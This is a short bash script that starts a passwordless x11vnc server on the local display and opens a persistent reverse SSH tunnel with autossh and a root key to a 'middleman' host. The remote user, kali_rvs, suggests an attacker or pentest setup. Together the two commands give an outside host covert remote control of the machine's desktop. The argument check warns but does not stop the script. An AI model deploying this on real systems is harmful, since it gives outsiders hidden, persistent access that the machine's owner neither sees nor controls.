#!/bin/bash
if test "$#" -ne 1; then
    echo "Must supply 1 argument - Middleman IP address"
fi


#Start x11 server
/usr/bin/x11vnc -bg -forever -display :0 -rfbport 5900 -noxfixes -noxdamage -noxrecord -localhost

#Reverse VNC Listener
/usr/bin/autossh -M 10986 -N -f -o "PubkeyAuthentication=yes" -o "PasswordAuthentication=no" -i /root/.ssh/nopwd -R 8888:localhost:5900 kali_rvs@$1 &


